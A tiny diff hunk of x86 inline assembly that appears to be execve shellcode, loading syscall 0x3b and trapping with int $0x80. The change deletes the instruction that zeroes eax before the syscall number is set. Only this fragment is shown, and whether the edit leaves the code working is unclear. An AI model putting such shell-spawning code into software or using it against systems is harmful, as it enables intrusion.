@@ -21,7 +21,6 @@ mov    %%esp,%%ecx
 push   %%edx
 push   %%ecx
 push   %%ebx
-xor    %%eax,%%eax
 mov    $0x3b,%%al
 push   $0x2a
 int    $0x80
